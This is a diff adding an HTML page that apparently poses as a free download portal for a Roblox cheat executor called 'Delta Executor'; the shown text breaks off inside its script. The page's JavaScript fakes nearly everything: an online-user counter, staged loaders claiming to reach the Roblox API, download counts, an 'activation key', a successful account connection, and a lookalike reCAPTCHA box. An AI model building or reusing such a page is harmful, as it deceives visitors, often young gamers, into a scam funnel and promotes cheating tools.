@@ -1,0 +1,1442 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Delta Executor Download — Free Roblox Executor for Mobile & PC | RoCrack 2026</title>
+    <meta name="description" content="Download Delta Executor for free — the #1 Roblox executor for mobile (Android/iOS) & PC. Level 8 execution, anti-ban, auto-update, instant key generation. The only mobile Roblox executor that works.">
+    <meta name="keywords" content="Delta Executor, Delta Executor download, Delta Executor mobile, Delta Executor APK, Delta Executor key, Delta Executor free, Roblox executor, Roblox executor download, Roblox executor mobile, Delta Executor Android, Delta Executor iOS, Delta Executor PC, best Roblox executor 2026, Delta Executor latest version, free Roblox executor">
+    <meta name="robots" content="index, follow">
+    <link rel="canonical" href="https://RoCrack.com/script/">
+    <link rel="icon" type="image/png" href="/logo.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #22c55e;
+            --primary-glow: rgba(34, 197, 94, 0.5);
+            --primary-dark: #16a34a;
+            --secondary: #10b981;
+            --bg-dark: #0a0a0f;
+            --bg-darker: #050508;
+            --bg-card: rgba(15, 15, 25, 0.9);
+            --text-primary: #ffffff;
+            --text-secondary: #a0a0b5;
+            --text-muted: #5a5a70;
+            --border-color: rgba(34, 197, 94, 0.2);
+            --success: #00ff6a;
+            --success-glow: rgba(0, 255, 106, 0.3);
+            --warning: #ffaa00;
+            --danger: #ef4444;
+            --danger-bg: rgba(239, 68, 68, 0.08);
+            --danger-border: rgba(239, 68, 68, 0.3);
+        }
+
+        .privacy-notice {
+            background: var(--danger-bg);
+            border: 2px solid var(--danger-border);
+            border-radius: 12px;
+            padding: 1rem 1.5rem;
+            margin-bottom: 2rem;
+            text-align: center;
+        }
+
+        .privacy-notice p {
+            color: #fca5a5;
+            font-size: 0.85rem;
+            line-height: 1.7;
+        }
+
+        .privacy-notice strong {
+            color: var(--danger);
+            font-weight: 700;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            overflow-x: hidden;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg-darker);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Background */
+        .bg-grid {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(34, 197, 94, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(34, 197, 94, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            z-index: 0;
+        }
+
+        .bg-glow {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            background: 
+                radial-gradient(ellipse 80% 50% at 50% 0%, rgba(34, 197, 94, 0.15), transparent 50%),
+                radial-gradient(ellipse 60% 40% at 0% 100%, rgba(34, 197, 94, 0.08), transparent 50%);
+            pointer-events: none;
+        }
+
+        .scanlines {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            pointer-events: none;
+            background: repeating-linear-gradient(
+                0deg,
+                transparent,
+                transparent 2px,
+                rgba(0, 0, 0, 0.1) 2px,
+                rgba(0, 0, 0, 0.1) 4px
+            );
+            opacity: 0.2;
+        }
+
+        /* Container */
+        .container {
+            position: relative;
+            z-index: 2;
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 2rem 1.5rem;
+            min-height: 100vh;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            padding: 2rem;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            margin-bottom: 2rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+        }
+
+        .back-link {
+            position: absolute;
+            top: 1rem;
+            left: 1rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.5rem 1rem;
+            background: rgba(34, 197, 94, 0.1);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--primary);
+            text-decoration: none;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            transition: all 0.3s;
+        }
+
+        .back-link:hover {
+            background: var(--primary);
+            color: var(--bg-dark);
+        }
+
+        .back-link svg {
+            width: 14px;
+            height: 14px;
+        }
+
+        .logo-image {
+            max-width: 340px;
+            height: auto;
+            margin-bottom: 1.5rem;
+            filter: drop-shadow(0 0 20px var(--primary-glow));
+        }
+
+        .header-description {
+            color: var(--text-secondary);
+            font-size: 1rem;
+            max-width: 500px;
+            margin-bottom: 1.5rem;
+            line-height: 1.6;
+        }
+
+        .stats-row {
+            display: flex;
+            gap: 2rem;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .stat-badge {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.5rem 1rem;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+        }
+
+        .stat-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            animation: blink 1.5s ease-in-out infinite;
+        }
+
+        .stat-dot.online { background: var(--success); box-shadow: 0 0 10px var(--success); }
+        .stat-dot.update { background: var(--warning); box-shadow: 0 0 10px var(--warning); }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+
+        .stat-value { color: var(--success); }
+
+        /* Step Card */
+        .step-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            position: relative;
+            overflow: hidden;
+            animation: fadeInUp 0.5s ease-out;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .step-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+        }
+
+        .step-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.4rem 1rem;
+            background: rgba(34, 197, 94, 0.1);
+            border: 1px solid var(--primary);
+            border-radius: 50px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--primary);
+            margin-bottom: 1.5rem;
+        }
+
+        .step-title {
+            font-family: 'Inter', sans-serif;
+            font-size: 1.5rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 1.5rem;
+            text-align: center;
+        }
+
+        /* Instructions */
+        .instructions {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .instructions-title {
+            font-family: 'Inter', sans-serif;
+            font-size: 0.9rem;
+            color: var(--primary);
+            margin-bottom: 1rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .instruction-step {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 0.8rem;
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+            line-height: 1.5;
+        }
+
+        .instruction-step:last-child {
+            margin-bottom: 0;
+        }
+
+        .instruction-num {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 24px;
+            height: 24px;
+            background: var(--primary);
+            color: var(--bg-dark);
+            font-family: 'Inter', sans-serif;
+            font-size: 0.75rem;
+            font-weight: 700;
+            border-radius: 50%;
+            flex-shrink: 0;
+        }
+
+        .instruction-step a {
+            color: var(--primary);
+            text-decoration: none;
+        }
+
+        .instruction-step a:hover {
+            text-decoration: underline;
+        }
+
+        .user-image {
+            display: block;
+            max-height: 100px;
+            margin: 1rem auto;
+        }
+
+        /* Input Group */
+        .input-group {
+            position: relative;
+            margin-bottom: 1rem;
+        }
+
+        .input-label {
+            display: block;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            margin-bottom: 0.5rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .input {
+            width: 100%;
+            padding: 1rem 1.5rem;
+            background: rgba(0, 0, 0, 0.5);
+            border: 2px solid var(--border-color);
+            border-radius: 12px;
+            color: var(--text-primary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1rem;
+            outline: none;
+            transition: all 0.3s;
+        }
+
+        .input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 20px var(--primary-glow);
+        }
+
+        .input::placeholder {
+            color: var(--text-muted);
+        }
+
+        /* Buttons */
+        .btn {
+            width: 100%;
+            padding: 1rem 2rem;
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-family: 'Inter', sans-serif;
+            font-size: 1rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px var(--primary-glow);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .btn:hover:not(:disabled)::before {
+            left: 100%;
+        }
+
+        /* Select */
+        .select {
+            width: 100%;
+            padding: 1rem 1.5rem;
+            background: rgba(0, 0, 0, 0.5);
+            border: 2px solid var(--border-color);
+            border-radius: 12px;
+            color: var(--text-primary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1rem;
+            outline: none;
+            cursor: pointer;
+            transition: all 0.3s;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%23ff0a0a' stroke-width='2'%3E%3Cpath d='M6 9l6 6 6-6'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 1rem center;
+        }
+
+        .select:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 20px var(--primary-glow);
+        }
+
+        .select:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .select option {
+            background: var(--bg-dark);
+            color: var(--text-primary);
+        }
+
+        /* Checkbox */
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 1rem;
+            padding: 1rem;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            margin-bottom: 1rem;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .checkbox-group:hover {
+            border-color: var(--primary);
+        }
+
+        .checkbox {
+            width: 24px;
+            height: 24px;
+            border: 2px solid var(--primary);
+            border-radius: 6px;
+            background: transparent;
+            cursor: pointer;
+            appearance: none;
+            position: relative;
+            flex-shrink: 0;
+        }
+
+        .checkbox:checked {
+            background: var(--primary);
+        }
+
+        .checkbox:checked::after {
+            content: '?';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .checkbox-label {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+            line-height: 1.5;
+        }
+
+        .checkbox-label span {
+            color: var(--primary);
+            font-weight: 600;
+        }
+
+        /* Success Message */
+        .success-box {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            padding: 1rem;
+            background: rgba(0, 255, 106, 0.1);
+            border: 1px solid var(--success);
+            border-radius: 12px;
+            color: var(--success);
+            font-family: 'Inter', sans-serif;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 1rem;
+        }
+
+        .success-box svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        /* Info Box */
+        .info-box {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.8rem 0;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .info-row:last-child {
+            border-bottom: none;
+        }
+
+        .info-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .info-value {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1rem;
+            font-weight: 600;
+        }
+
+        .info-value.user { color: var(--text-primary); }
+        .info-value.key { color: var(--success); }
+        .info-value.time { color: var(--warning); }
+
+        /* Recaptcha */
+        .recaptcha-wrapper {
+            display: flex;
+            justify-content: center;
+            margin-top: 1.5rem;
+        }
+
+        .recaptcha-box {
+            background: #f9f9f9;
+            border: 1px solid #d3d3d3;
+            border-radius: 4px;
+            width: 300px;
+            height: 78px;
+            display: flex;
+            align-items: center;
+            padding: 0 12px;
+            gap: 12px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .recaptcha-box:hover {
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .recaptcha-checkbox {
+            width: 28px;
+            height: 28px;
+            border: 2px solid #c1c1c1;
+            border-radius: 3px;
+            background: #fff;
+            position: relative;
+            flex-shrink: 0;
+        }
+
+        .recaptcha-spinner {
+            display: none;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #4a8ef6;
+            border-radius: 50%;
+            width: 22px;
+            height: 22px;
+            animation: spin 1s linear infinite;
+            position: absolute;
+            top: 1px;
+            left: 1px;
+        }
+
+        .recaptcha-checkmark {
+            display: none;
+            position: absolute;
+            top: 3px;
+            left: 6px;
+            width: 10px;
+            height: 16px;
+            border: solid #4a8ef6;
+            border-width: 0 3px 3px 0;
+            transform: rotate(45deg);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .recaptcha-content {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .recaptcha-text {
+            color: #555;
+            font-size: 14px;
+            font-family: Roboto, Arial, sans-serif;
+        }
+
+        .recaptcha-branding {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .recaptcha-branding img {
+            width: 24px;
+            height: 24px;
+        }
+
+        .recaptcha-branding-text {
+            font-size: 10px;
+            color: #555;
+            font-family: Roboto, Arial, sans-serif;
+        }
+
+        /* Loading Overlay */
+        .loading-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.9);
+            backdrop-filter: blur(10px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 100;
+        }
+
+        .loading-card {
+            background: var(--bg-card);
+            border: 1px solid var(--primary);
+            border-radius: 20px;
+            padding: 3rem 4rem;
+            text-align: center;
+            box-shadow: 0 0 50px var(--primary-glow);
+            animation: pulse-border 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse-border {
+            0%, 100% { box-shadow: 0 0 30px var(--primary-glow); }
+            50% { box-shadow: 0 0 60px var(--primary-glow); }
+        }
+
+        .loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid var(--border-color);
+            border-top: 4px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 1.5rem;
+        }
+
+        .loading-message {
+            font-family: 'Inter', sans-serif;
+            font-size: 1rem;
+            color: var(--text-primary);
+            margin-bottom: 1.5rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: var(--border-color);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 0.5rem;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), #4ade80);
+            width: 0%;
+            transition: width 0.3s;
+        }
+
+        .progress-text {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+            color: var(--text-muted);
+        }
+
+        /* Utilities */
+        .hidden {
+            display: none !important;
+        }
+
+        .text-center {
+            text-align: center;
+        }
+
+        .mb-1 { margin-bottom: 1rem; }
+        .mt-1 { margin-top: 1rem; }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .container {
+                padding: 1rem;
+            }
+
+            .header {
+                padding: 1.5rem 1rem;
+            }
+
+            .back-link {
+                position: relative;
+                top: 0;
+                left: 0;
+                margin-bottom: 1rem;
+            }
+
+            .logo-image {
+                max-width: 200px;
+            }
+
+            .stats-row {
+                gap: 1rem;
+            }
+
+            .loading-card {
+                padding: 2rem;
+                margin: 1rem;
+            }
+        }
+
+        /* SEO Content Section */
+        .seo-content {
+            margin-top: 2rem;
+            padding: 3rem 2rem;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        .seo-content::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+        }
+        .seo-content h2 {
+            font-family: 'Inter', sans-serif;
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--primary);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin: 2.5rem 0 1rem;
+        }
+        .seo-content h2:first-of-type { margin-top: 0; }
+        .seo-content h3 {
+            font-family: 'Inter', sans-serif;
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin: 1.8rem 0 0.8rem;
+            letter-spacing: 1px;
+        }
+        .seo-content p {
+            color: var(--text-secondary);
+            font-size: 1.05rem;
+            line-height: 1.8;
+            margin-bottom: 1rem;
+        }
+        .seo-content ul, .seo-content ol {
+            color: var(--text-secondary);
+            font-size: 1.05rem;
+            line-height: 1.8;
+            margin-bottom: 1rem;
+            padding-left: 1.5rem;
+        }
+        .seo-content li { margin-bottom: 0.5rem; }
+        .seo-content strong { color: var(--text-primary); }
+        .seo-content a { color: var(--primary); text-decoration: none; }
+        .seo-content a:hover { text-decoration: underline; }
+        .seo-content .faq-item {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin-bottom: 1rem;
+        }
+        .seo-content .faq-item h4 {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 0.5rem;
+        }
+        .seo-content .faq-item p { margin-bottom: 0; }
+        @media (max-width: 768px) {
+            .seo-content { padding: 2rem 1.2rem; }
+            .seo-content h2 { font-size: 1.25rem; }
+        }
+    </style>
+    <script defer src="https://analytics.ufomedia.xyz/script.js" data-website-id="2418580b-7c61-4c49-aa38-6798ab7c5af9"></script>
+</head>
+<body>
+    <div class="bg-grid"></div>
+    <div class="bg-glow"></div>
+    <div class="scanlines"></div>
+
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <a href="../index.html" class="back-link">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M19 12H5M12 19l-7-7 7-7"/>
+                </svg>
+                BACK
+            </a>
+            <img src="/logo.png" alt="RoCrack" class="logo-image">
+            <p class="header-description">
+          The most powerful and reliable Roblox script executor, trusted by millions of users worldwide.
+        </p>
+            <div class="stats-row">
+                <div class="stat-badge">
+                    <span class="stat-dot update"></span>
+                    <span id="currentDate"></span>
+          </div>
+                <div class="stat-badge">
+                    <span class="stat-dot online"></span>
+                    <span id="onlineUsers" class="stat-value">847</span> ONLINE
+      </div>
+    </div>
+  </header>
+
+        <div class="privacy-notice">
+            <p>&#9888; <strong>WE NEVER ASK FOR YOUR PERSONAL DATA.</strong> We only need your <strong>Roblox username</strong> (public info). We will <strong>NEVER</strong> ask for your password, email, or any account credentials. <strong>Never share your password with anyone.</strong></p>
+        </div>
+
+      <!-- Step 1: Roblox Username -->
+        <div id="step1" class="step-card">
+            <span class="step-badge">STEP 1 OF 3</span>
+            <h2 class="step-title">Enter Your Roblox Username</h2>
+
+          <div class="input-group">
+                <label class="input-label">Roblox Username</label>
+                <input type="text" id="robloxId" class="input" placeholder="Enter your Roblox username">
+            </div>
+
+            <button id="searchButton" class="btn" disabled>
+                Continue
+            </button>
+
+            <div id="userFound" class="success-box hidden">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M20 6L9 17l-5-5"/>
+                </svg>
+                User Found Successfully!
+        </div>
+      </div>
+
+      <!-- Step 2: Script Selection -->
+        <div id="step2" class="step-card hidden">
+            <span class="step-badge">STEP 2 OF 3</span>
+            <h2 class="step-title">Select Script</h2>
+
+            <label class="checkbox-group">
+                <input type="checkbox" id="install" class="checkbox">
+                <span class="checkbox-label">
+                Install Delta Executor to "<span id="selectedId"></span>"
+                </span>
+              </label>
+
+            <div class="input-group">
+                <label class="input-label">Choose Script</label>
+                <select id="scriptSelect" class="select" disabled>
+                    <option value="">Select a script</option>
+                </select>
+            </div>
+
+            <button id="continueButton" class="btn" disabled>
+              Continue
+            </button>
+      </div>
+
+      <!-- Step 3: Final Step -->
+        <div id="step3" class="step-card hidden">
+            <span class="step-badge">STEP 3 OF 3</span>
+            <h2 class="step-title">API Connected!</h2>
+
+            <div class="success-box mb-1">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M20 6L9 17l-5-5"/>
+                </svg>
+                Successfully Connected
+            </div>
+
+            <p class="text-center text-secondary mb-1">
+                You have successfully connected your account to the Delta Executor Server API!
+            </p>
+
+            <div class="info-box">
+                <div class="info-row">
+                    <span class="info-label">User Connected</span>
+                    <span id="connectedUser" class="info-value user"></span>
+              </div>
+                <div class="info-row">
+                    <span class="info-label">Activation Key</span>
+                    <span id="generatedKey" class="info-value key"></span>
+              </div>
+                <div class="info-row">
+                    <span class="info-label">Time Left</span>
+                    <span id="timeLeft" class="info-value time"></span>
+              </div>
+            </div>
+
+            <div class="recaptcha-wrapper">
+                <div class="recaptcha-box" onclick="verifyCaptcha()">
+                    <div class="recaptcha-checkbox">
+                        <div class="recaptcha-spinner" id="spinner"></div>
+                        <div class="recaptcha-checkmark" id="checkmark"></div>
+    </div>
+                    <div class="recaptcha-content">
+                        <span class="recaptcha-text">I'm not a robot</span>
+                        <div class="recaptcha-branding">
+        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+                            <span class="recaptcha-branding-text">reCAPTCHA · Privacy · Terms</span>
+    </div>
+  </div>
+</div>
+          </div>
+        </div>
+
+  <!-- Loading Overlay -->
+  <div id="loadingOverlay" class="loading-overlay hidden">
+    <div class="loading-card">
+            <div class="loading-spinner"></div>
+            <p id="loadingMessage" class="loading-message">Processing...</p>
+          <div class="progress-bar">
+                <div id="progressBar" class="progress-fill"></div>
+          </div>
+          <p id="progressText" class="progress-text">0%</p>
+        </div>
+      </div>
+
+    <script>
+        // Script list
+        const scripts = [
+            { name: 'Overflow', downloads: '4.2M' },
+            { name: 'Soluna', downloads: '3.9M' },
+            { name: 'Mozil Hub', downloads: '3.4M' },
+            { name: 'Forge Hub', downloads: '1.4M' },
+            { name: 'Nicuse', downloads: '1.4M' },
+            { name: 'HuskyHub', downloads: '1.4M' },
+            { name: 'Unfair Hub', downloads: '3.4M' },
+            { name: 'Oblivion V1', downloads: '1.6M' },
+            { name: 'Bean Hub', downloads: '1.4M' },
+            { name: 'Mango Hub', downloads: '1.2M' },
+            { name: 'Stingray', downloads: '1.2M' },
+            { name: 'PEELY HUB', downloads: '1.2M' },
+            { name: 'XIBA HUB', downloads: '1.2M' },
+            { name: 'Soggyware', downloads: '1.1M' },
+            { name: 'BT Project', downloads: '1.1M' },
+            { name: 'Project M', downloads: '1.1M' },
+            { name: 'Sub Hub v3', downloads: '1.1M' },
+            { name: 'BANANA S', downloads: '1.1M' },
+            { name: 'CHIBB HUB', downloads: '1.0M' },
+            { name: 'PS99', downloads: '999.8k' },
+        ];
+
+        // DOM Elements
+        const currentDateEl = document.getElementById('currentDate');
+        const onlineUsersEl = document.getElementById('onlineUsers');
+        const robloxIdInput = document.getElementById('robloxId');
+        const searchButton = document.getElementById('searchButton');
+        const userFoundEl = document.getElementById('userFound');
+        const installCheckbox = document.getElementById('install');
+        const scriptSelect = document.getElementById('scriptSelect');
+        const continueButton = document.getElementById('continueButton');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const progressBar = document.getElementById('progressBar');
+        const progressText = document.getElementById('progressText');
+        const loadingMessage = document.getElementById('loadingMessage');
+        const selectedIdEl = document.getElementById('selectedId');
+        const connectedUserEl = document.getElementById('connectedUser');
+        const generatedKeyEl = document.getElementById('generatedKey');
+        const timeLeftEl = document.getElementById('timeLeft');
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+
+        // Initialize date
+        const date = new Date();
+        const months = ['JAN', 'FEB', 'MAR', 'APR', 'MAY', 'JUN', 'JUL', 'AUG', 'SEP', 'OCT', 'NOV', 'DEC'];
+        currentDateEl.textContent = `${months[date.getMonth()]} ${date.getDate()}, ${date.getFullYear()}`;
+
+        // Update online users
+        let onlineUsers = 847;
+        function updateOnlineUsers() {
+            const change = Math.floor(Math.random() * 20) - 10;
+            onlineUsers = Math.min(Math.max(onlineUsers + change, 800), 900);
+            onlineUsersEl.textContent = onlineUsers;
+        }
+        setInterval(updateOnlineUsers, 3000);
+
+        // Populate scripts
+        scripts.forEach(script => {
+            const option = document.createElement('option');
+            option.value = script.name;
+            option.textContent = `${script.name} - ${script.downloads} downloads`;
+            scriptSelect.appendChild(option);
+        });
+
+        // Input validation
+        robloxIdInput.addEventListener('input', () => {
+            searchButton.disabled = !robloxIdInput.value.trim();
+        });
+
+        // Search user with multi-stage loader
+        searchButton.addEventListener('click', async () => {
+            const robloxId = robloxIdInput.value.trim();
+            if (!robloxId) return;
+
+            const stages = [
+                { msg: 'CONNECTING TO ROBLOX API...', duration: 1500 },
+                { msg: 'SEARCHING FOR USER...', duration: 2000 },
+                { msg: 'LOADING PROFILE DATA...', duration: 1500 },
+                { msg: 'USER FOUND!', duration: 800 }
+            ];
+
+            loadingOverlay.classList.remove('hidden');
+            progressBar.style.width = '0%';
+            progressText.textContent = '0%';
+
+            let totalDuration = stages.reduce((a, s) => a + s.duration, 0);
+            let elapsed = 0;
+
+            for (const stage of stages) {
+                loadingMessage.textContent = stage.msg;
+                const stageStart = elapsed;
+                await new Promise(resolve => {
+                    const start = Date.now();
+                    function tick() {
+                        const dt = Date.now() - start;
+                        const stageProgress = Math.min(dt / stage.duration, 1);
+                        const overall = ((stageStart + stage.duration * stageProgress) / totalDuration) * 100;
+                        progressBar.style.width = overall + '%';
+                        progressText.textContent = Math.floor(overall) + '%';
+                        if (dt < stage.duration) requestAnimationFrame(tick);
+                        else resolve();
+                    }
+                    requestAnimationFrame(tick);
+                });
+                elapsed += stage.duration;
+            }
+
+            loadingOverlay.classList.add('hidden');
+
+            userFoundEl.classList.remove('hidden');
+            setTimeout(() => {
+                step1.classList.add('hidden');
+                step2.classList.remove('hidden');
+                if (typeof trackStep === 'function') trackStep('step2');
+                selectedIdEl.textContent = robloxId;
+            }, 1000);
+        });
+
+        // Checkbox
+        installCheckbox.addEventListener('change', () => {
+            scriptSelect.disabled = !installCheckbox.checked;
+            updateContinueButton();
+        });
+
+        // Script selection
+        scriptSelect.addEventListener('change', updateContinueButton);
+
+        function updateContinueButton() {
+            continueButton.disabled = !installCheckbox.checked || !scriptSelect.value;
+        }
+
+        // Continue button
+        continueButton.addEventListener('click', async () => {
+            showLoading('PROCESSING REQUEST...');
+            await simulateProgress(4000);
+            hideLoading();
+
+            step2.classList.add('hidden');
+            step3.classList.remove('hidden');
+            if (typeof trackStep === 'function') trackStep('step3');
+
+            connectedUserEl.textContent = robloxIdInput.value;
+            generatedKeyEl.textContent = 'KEY_' + generateRandomKey();
+            startTimer();
+        });
+
+        // Generate random key
+        function generateRandomKey() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let key = '';
+            for (let i = 0; i < 16; i++) {
+                key += chars.charAt(Math.floor(Math.random() * chars.length));
+                if (i === 7) key += '_';
+            }
+            return key.slice(0, 8) + '********';
+        }
+
+        // Loading functions
+        function showLoading(message) {
+            loadingMessage.textContent = message;
+            loadingOverlay.classList.remove('hidden');
+        }
+
+        function hideLoading() {
+            loadingOverlay.classList.add('hidden');
+            progressBar.style.width = '0%';
+            progressText.textContent = '0%';
+        }
+
+        async function simulateProgress(duration) {
+            const startTime = Date.now();
+            return new Promise(resolve => {
+                function update() {
+                    const elapsed = Date.now() - startTime;
+                    const progress = Math.min((elapsed / duration) * 100, 100);
+                    progressBar.style.width = `${progress}%`;
+                    progressText.textContent = `${Math.floor(progress)}%`;
